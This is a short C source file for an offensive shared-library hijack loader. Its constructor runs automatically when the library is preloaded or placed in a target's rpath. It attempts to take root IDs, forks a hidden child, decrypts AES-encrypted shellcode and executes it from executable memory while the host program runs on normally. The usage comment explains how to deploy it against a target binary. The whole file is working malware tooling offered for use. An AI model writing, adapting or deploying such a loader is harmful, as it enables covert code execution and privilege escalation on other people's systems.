/*
 * hijack-lib.c — Shared-library hijack via constructor (AES shellcode)
 *
 * Constructor decrypts and executes AES-encrypted shellcode in a forked
 * child. The host process continues normally.
 *
 * Usage:  LD_PRELOAD=./hijack-lib.so target_binary
 *         — or copy to a writable directory in the target's rpath/runpath
 */

#include <string.h>
#include <sys/mman.h>
#include <stdint.h>
#include <unistd.h>

#include "aes.h"
#include "shellcode.h"

static void payload(void) __attribute__((constructor));

void payload(void) {
    setuid(0);
    setgid(0);

    pid_t pid = fork();
    if (pid != 0)
        return; /* parent: host process continues */

    /* child: decrypt + exec shellcode */
    int pt_len = aes_decrypt_ecb(shellcode, shellcode_len, aes_key, shellcode);
    if (pt_len < 0)
        _exit(1);

    void *mem = mmap(NULL, (size_t)pt_len,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANON | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED)
        _exit(1);

    memcpy(mem, shellcode, (size_t)pt_len);
    ((void(*)())mem)();
    _exit(0);
}
